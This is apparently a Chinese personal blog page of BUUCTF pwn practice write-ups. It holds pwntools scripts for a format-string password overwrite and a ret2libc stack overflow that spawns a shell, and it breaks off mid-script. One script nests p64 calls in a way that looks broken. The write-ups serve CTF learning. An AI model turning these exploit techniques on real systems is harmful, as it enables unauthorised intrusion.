<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    buu做题记录
  </title>
  <meta name="description" content="">
  <meta name="keywords" content="">
  <meta name="author" content="s1nec-1o">
  <link rel="canonical" href="http://example.com/2024/03/11/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
  
  
  <link rel="icon" href='/img/favicon.ico'>
  
  
  
<link rel="stylesheet" href="/css/b4c95347.css">

  <script>window.i18n = {"tip-status-done":"完成","tip-status-default":"全部","tip-status-todo":"计划","tip-status-doing":"进行","tip-status-other":"其他","text-select":"选择","text-move":"移动","text-esc":"退出","January":"一月","February":"二月","March":"三月","April":"四月","May":"五月","June":"六月","July":"七月","August":"八月","September":"九月","October":"十月","November":"十一月","December":"十二月"}</script>
<meta name="generator" content="Hexo 7.0.0"></head>

<body id="app">
  <aside id="aside-box" class="left-aside">
    <div class="header">
      
<link rel="stylesheet" href="/css/61875ce9.css">

<div class="profile">
  <a class="badge" href="/">
    <span>Hi</span>
    <span>s1nec-1o</span>
  </a>
  <cosy-tooltip id="left-aside-button" placement="right">
    <span slot="content">
      <span>显示 / 隐藏 左侧导航</span>
      <cosy-short-key>[</cosy-short-key>
    </span>
    <cosy-icon>
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
        <g fill="none">
          <path d="M16 4c1.104-.019 2 .896 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h12zm1 2a1 1 0 0 0-1-1h-2.995v10H16a1 1 0 0 0 1-1V6zm-4.995 9V5H4.001a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8.004z" fill="currentColor"></path>
        </g>
      </svg>
    </cosy-icon>
  </cosy-tooltip>
</div>

<script src="/js/a66044b6.js"></script>

      


<cosy-search id="post-search" placeholder="搜索">
  <div slot="short-key">
    <cosy-short-key>⌘</cosy-short-key>
    <cosy-short-key>K</cosy-short-key>
  </div>
</cosy-search>


<script>
  window.algolia = {
    appId: "R34LY1BBPU",
    SearchOnlyAPIKey: "4fd025154505a4b00fb416f52993d700"
  }
</script>


<script src="/js/5f00f278.js"></script>

    </div>
    <div class="aside-category">
      
<link rel="stylesheet" href="/css/db04a759.css">


<nav class="category-nav cosy-scrollbar">
  <ul><li data-path="archives">
        <a href="/archives">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M3.5 3A1.5 1.5 0 0 0 2 4.5v4A1.5 1.5 0 0 0 3.5 10h9A1.5 1.5 0 0 0 14 8.5v-4A1.5 1.5 0 0 0 12.5 3h-9zM3 4.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm.5 6.5A1.5 1.5 0 0 0 2 12.5v4A1.5 1.5 0 0 0 3.5 18h9a1.5 1.5 0 0 0 1.5-1.5v-4a1.5 1.5 0 0 0-1.5-1.5h-9zM3 12.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm14-.063a2.003 2.003 0 0 1-2.5-1.937A2 2 0 0 1 16 8.563a2.005 2.005 0 0 1 1 0a2 2 0 0 1 0 3.874zM16.5 3a.5.5 0 0 1 .5.5v4.041a3.02 3.02 0 0 0-1 0V3.5a.5.5 0 0 1 .5-.5zm0 10.5c-.17 0-.337-.014-.5-.041V17.5a.5.5 0 0 0 1 0v-4.041c-.163.027-.33.041-.5.041z" fill="currentColor"></path></g></svg>
          <div class="ellipsis">归档</div>
        </a>
      </li><li data-path="cosy-roadmap">
        <a href="/cosy-roadmap">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M9.384 2a1 1 0 0 0-.966.742L4.616 17H2.5a.5.5 0 0 0 0 1h15a.5.5 0 0 0 0-1h-2.116L11.582 2.742A1 1 0 0 0 10.616 2H9.384zM5.651 17l.8-3H11.5a.5.5 0 0 0 0-1H6.717l.534-2H10.5a.5.5 0 0 0 0-1H7.517l1.867-7h1.232l3.733 14H5.651z" fill="currentColor"></path></g></svg>
          <div class="ellipsis">路线图</div>
        </a>
      </li><li data-path="cosy-resume">
        <a href="/cosy-resume">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M8.5 4.498a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0zm1.5-2.5a2.5 2.5 0 0 0-2.43 3.086L5.471 4.15a1.761 1.761 0 0 0-2.317.88c-.4.882-.008 1.917.877 2.31L7 8.662v2.287l-1.877 4.645a1.75 1.75 0 0 0 3.245 1.311l1.556-3.849a.073.073 0 0 1 .028-.038a.086.086 0 0 1 .046-.012c.02 0 .035.005.046.012a.074.074 0 0 1 .028.038l1.555 3.849a1.75 1.75 0 0 0 3.245-1.311L13 10.96V8.662l2.968-1.322a1.74 1.74 0 0 0 .877-2.31a1.761 1.761 0 0 0-2.317-.88l-2.097.934a2.5 2.5 0 0 0-2.43-3.086zM4.065 5.444a.761.761 0 0 1 1-.38l3.918 1.744a2.5 2.5 0 0 0 2.034 0l3.918-1.744a.761.761 0 0 1 1 .38a.739.739 0 0 1-.373.983l-2.969 1.321a1 1 0 0 0-.593.914v2.298a1 1 0 0 0 .073.375l1.872 4.633a.75.75 0 0 1-1.39.562l-1.556-3.849c-.364-.9-1.639-.9-2.003 0l-1.555 3.85a.75.75 0 1 1-1.39-.562l1.876-4.646A1 1 0 0 0 8 10.95V8.662a1 1 0 0 0-.593-.914L4.438 6.427a.739.739 0 0 1-.373-.983z" fill="currentColor"></path></g></svg>
          <div class="ellipsis">简历</div>
        </a>
      </li><li data-path="link">
        <a href="/link">
          <svg t="1705378180027" class="icon" viewBox="-250 -250 1400 1400" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1450" width="200" height="200"><path d="M593.94368 715.648a10.688 10.688 0 0 0-14.976 0L424.21568 870.4c-71.68 71.68-192.576 79.232-271.68 0-79.232-79.232-71.616-200 0-271.616l154.752-154.752a10.688 10.688 0 0 0 0-15.04l-52.992-52.992a10.688 10.688 0 0 0-15.04 0L84.50368 530.688a287.872 287.872 0 0 0 0 407.488 288 288 0 0 0 407.488 0l154.752-154.752a10.688 10.688 0 0 0 0-15.04l-52.736-52.736z m344.384-631.168a288.256 288.256 0 0 1 0 407.616l-154.752 154.752a10.688 10.688 0 0 1-15.04 0l-52.992-52.992a10.688 10.688 0 0 1 0-15.104l154.752-154.688c71.68-71.68 79.232-192.448 0-271.68-79.104-79.232-200-71.68-271.68 0L443.92768 307.2a10.688 10.688 0 0 1-15.04 0l-52.864-52.864a10.688 10.688 0 0 1 0-15.04l154.88-154.752a287.872 287.872 0 0 1 407.424 0z m-296.32 240.896l52.672 52.736a10.688 10.688 0 0 1 0 15.04l-301.504 301.44a10.688 10.688 0 0 1-15.04 0l-52.736-52.672a10.688 10.688 0 0 1 0-15.04l301.632-301.504a10.688 10.688 0 0 1 15.04 0z" fill="currentColor" p-id="1451"></path></svg>
          <div class="ellipsis">友链</div>
        </a>
      </li></ul>
  <ul><li class="">
        <a href="/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/">
          
          <div class="ellipsis">
            <span>2024ROIS冬令营</span>
          </div>
        </a>
      </li><li class="">
        <a href="/categories/Pwn%E7%9F%A5%E8%AF%86/">
          
          <div class="ellipsis">
            <span>Pwn知识</span>
          </div>
        </a>
      </li><li class="active">
        <a href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
          
          <div class="ellipsis">
            <span>做题记录</span>
          </div>
        </a>
      </li><li class="">
        <a href="/categories/%E5%B0%8F%E6%AF%94%E8%B5%9B/">
          
          <div class="ellipsis">
            <span>小比赛</span>
          </div>
        </a>
      </li><li class="">
        <a href="/categories/%E6%80%BB%E7%BB%93/">
          
          <div class="ellipsis">
            <span>总结</span>
          </div>
        </a>
      </li></ul>
</nav>


<script src="/js/118098c2.js"></script>

    </div>
    <div class="bottom">
      <cosy-tooltip id="button-preference" placement="right">
        <span slot="content">
          <span>偏好</span>
          <cosy-short-key>⌘</cosy-short-key>
          <cosy-short-key>p</cosy-short-key>
        </span>
        <cosy-icon bordered id="button-about-cosy-theme">
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16">
            <g fill="none">
              <path d="M8 6a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM7 8a1 1 0 1 1 2 0a1 1 0 0 1-2 0zm3.618-3.602a.708.708 0 0 1-.824-.567l-.26-1.416a.354.354 0 0 0-.275-.282a6.072 6.072 0 0 0-2.519 0a.354.354 0 0 0-.275.282l-.259 1.416a.71.71 0 0 1-.936.538l-1.359-.484a.355.355 0 0 0-.382.095c-.569.627-1 1.367-1.262 2.173a.352.352 0 0 0 .108.378l1.102.931a.704.704 0 0 1 0 1.076l-1.102.931a.352.352 0 0 0-.108.378A5.986 5.986 0 0 0 3.53 12.02a.355.355 0 0 0 .382.095l1.36-.484a.708.708 0 0 1 .936.538l.258 1.416c.026.14.135.252.275.281a6.075 6.075 0 0 0 2.52 0a.353.353 0 0 0 .274-.281l.26-1.416a.71.71 0 0 1 .936-.538l1.359.484c.135.048.286.01.382-.095c.569-.627 1-1.367 1.262-2.173a.352.352 0 0 0-.108-.378l-1.102-.931a.703.703 0 0 1 0-1.076l1.102-.931a.352.352 0 0 0 .108-.378A5.985 5.985 0 0 0 12.47 3.98a.355.355 0 0 0-.382-.095l-1.36.484a.71.71 0 0 1-.111.03zm-6.62.58l.937.333a1.71 1.71 0 0 0 2.255-1.3l.177-.97a5.105 5.105 0 0 1 1.265 0l.178.97a1.708 1.708 0 0 0 2.255 1.3L12 4.977c.255.334.467.698.63 1.084l-.754.637a1.704 1.704 0 0 0 0 2.604l.755.637a4.99 4.99 0 0 1-.63 1.084l-.937-.334a1.71 1.71 0 0 0-2.255 1.3l-.178.97a5.099 5.099 0 0 1-1.265 0l-.177-.97a1.708 1.708 0 0 0-2.255-1.3L4 11.023a4.987 4.987 0 0 1-.63-1.084l.754-.638a1.704 1.704 0 0 0 0-2.603l-.755-.637c.164-.386.376-.75.63-1.084z" fill="currentColor"></path>
            </g>
          </svg>
        </cosy-icon>
      </cosy-tooltip>
    </div>
  </aside>
  <main>
    
<link rel="stylesheet" href="/css/9bb9a539.css">


<div class="post-container">
  <header>
    <div class="left">
      
<link rel="stylesheet" href="/css/7d333f9e.css">

<nav class="breadcrumb">
  <section>
    <cosy-tooltip placement="bottom-left">
      <span slot="content"><span>首页</span>
        <cosy-short-key>⌘</cosy-short-key>
        <cosy-short-key>H</cosy-short-key>
      </span>
      <cosy-icon href="/">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
          <g fill="none">
            <path d="M8.998 2.388a1.5 1.5 0 0 1 2.005 0l5.5 4.942A1.5 1.5 0 0 1 17 8.445V15.5a1.5 1.5 0 0 1-1.5 1.5H13a1.5 1.5 0 0 1-1.5-1.5V12a.5.5 0 0 0-.5-.5H9a.5.5 0 0 0-.5.5v3.5A1.5 1.5 0 0 1 7 17H4.5A1.5 1.5 0 0 1 3 15.5V8.445c0-.425.18-.83.498-1.115l5.5-4.942zm1.336.744a.5.5 0 0 0-.668 0l-5.5 4.942A.5.5 0 0 0 4 8.445V15.5a.5.5 0 0 0 .5.5H7a.5.5 0 0 0 .5-.5V12A1.5 1.5 0 0 1 9 10.5h2a1.5 1.5 0 0 1 1.5 1.5v3.5a.5.5 0 0 0 .5.5h2.5a.5.5 0 0 0 .5-.5V8.445a.5.5 0 0 0-.166-.371l-5.5-4.942z" fill="currentColor"></path>
          </g>
        </svg>
      </cosy-icon>
    </cosy-tooltip>
    
    
    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
      <g fill="none">
        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
      </g>
    </svg>
    <a class="ellipsis" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
      做题记录
    </a>
    
    
    
    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
      <g fill="none">
        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
      </g>
    </svg>
    <span class="ellipsis">
      buu做题记录
    </span>
    
  </section>
</nav>


<script src="/js/31d6cfe0.js"></script>

    </div>
    <div class="right">
      
      <cosy-tooltip id="toc-show-button" placement="left">
        <span slot="content">
          <span>显示 / 隐藏 文章目录</span>
          <cosy-short-key>]</cosy-short-key>
        </span>
        <cosy-icon>
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
            <g fill="none">
              <path d="M4 4c-1.104-.019-2 .896-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H4zM3 6a1 1 0 0 1 1-1h2.995v10H4a1 1 0 0 1-1-1V6zm4.995 9V5h8.004a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7.995z" fill="currentColor"></path>
            </g>
          </svg>
        </cosy-icon>
      </cosy-tooltip>
      
    </div>
  </header>
  <div class="content">
    <main class="cosy-scrollbar">
      <div class="article-container">
        <!-- 渲染文章内容 -->
        <article>
          <!-- 文章标题 -->
          <h1 class="post-title">buu做题记录</h1>
          <div class="last-updated">
            上次更新: 2024-03-13 21:00:20
          </div>
          <!-- 文章 -->
          <h1 id="buu做题记录1"><a href="#buu做题记录1" class="headerlink" title="buu做题记录1"></a>buu做题记录1</h1><p>算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，之后也不知道要干什么，就这样子吧</p>
<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059129.png" alt="image-20240303211815707" style="zoom:50%;" />

<p>可以看到有格式字符串漏洞，原本因为1想的是password会在栈上出现，但是并没有应该是被覆盖掉了，因此我们想到直接修改password</p>
<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059131.png" alt="image-20240303211726790" style="zoom:50%;" />

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token comment">#sh=process('./pwn5')</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27277</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'your name:'</span><span class="token punctuation">)</span>
pal<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x804C044</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804C045</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804C046</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804C047</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'%10$n%11$n%12$n%13$n'</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pal<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10101010</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf-2019-babyheap"></a>rctf-2019-babyheap</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
RELRO<span class="token operator">:</span>    Full RELRO
Stack<span class="token operator">:</span>    Canary found
NX<span class="token operator">:</span>       NX enabled
PIE<span class="token operator">:</span>      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>
  __int16 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-20h]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your Plaintext to be encrypted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>x<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment">// '\0'绕过</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">122</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">47</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">57</span> <span class="token punctuation">)</span>
          s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xFu</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xEu</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      s<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xDu</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token operator">++</span>x<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Ciphertext"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题主要是栈溢出，然后有个加密要绕过，因此先传入’\0’绕过strlen</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>

context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_c_1'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_c_1'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">overflow</span><span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Input your choice!\n'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Input your Plaintext to be encrypted\n'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x00'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x57</span><span class="token operator">+</span>content<span class="token punctuation">)</span>


main_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

poprid_ret<span class="token operator">=</span><span class="token number">0x0000000000400c83</span>
ret<span class="token operator">=</span><span class="token number">0x00000000004006b9</span>

overflow<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>poprid_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Ciphertext\n\n'</span><span class="token punctuation">)</span>
puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>

overflow<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>poprid_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是不知道为什么我的libcsearcher一直用不了，所以用网上找的偏移</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">from pwn import<span class="token operator">*</span>
sh<span class="token operator">=</span><span class="token function">remote</span><span class="token punctuation">(</span><span class="token char">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29738</span><span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token function">ELF</span><span class="token punctuation">(</span><span class="token char">'./ciscn_2019_c_1'</span><span class="token punctuation">)</span>
puts_plt<span class="token operator">=</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token char">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token char">'puts'</span><span class="token punctuation">]</span>
main_addr<span class="token operator">=</span>e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token char">'main'</span><span class="token punctuation">]</span>
rdi_addr<span class="token operator">=</span><span class="token number">0x0000000000400c83</span>
ret<span class="token operator">=</span><span class="token number">0x00000000004006b9</span>
sh<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>b<span class="token char">'1'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
padding<span class="token operator">=</span>b<span class="token char">'\x00'</span><span class="token operator">+</span>b<span class="token char">'a'</span><span class="token operator">*</span><span class="token number">0x57</span>
sh<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>padding<span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span><span class="token function">recvuntil</span><span class="token punctuation">(</span>b<span class="token char">'Ciphertext\n\n'</span><span class="token punctuation">)</span>   
puts_addr <span class="token operator">=</span> <span class="token function">u64</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span><span class="token function">recv</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token char">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span><span class="token number">0x0809c0</span>
